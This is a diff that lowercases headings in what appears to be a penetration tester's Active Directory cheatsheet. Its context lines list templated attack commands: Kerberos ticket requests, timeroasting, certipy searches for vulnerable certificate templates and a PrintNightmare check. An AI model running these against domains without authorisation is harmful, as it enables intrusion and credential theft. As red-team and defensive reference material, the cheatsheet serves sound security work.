@@ -1,7 +1,7 @@
 # Active Directory
 #target/remote #os/linux #cat/ad
 
-## AD all in one
+## ad all in one
 #faketime
 ```
 getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
@@ -37,7 +37,7 @@ nxc smb <ip> -u '<user>' -p '<password>' -M timeroast
 powerview <domain>/'<user>:<password>'@<dc_fqdn> --no-cache
 ```
 
-## AD additional user all in one
+## ad additional user all in one
 #faketime
 ```
 getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
@@ -49,7 +49,7 @@ nxc smb <ip> --use-kcache --shares
 certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap
 ```
 
-## AD sensitive
+## ad sensitive
 ```
 nxc smb <ip> -u '<user>' -p '<password>' -M printnightmare
 
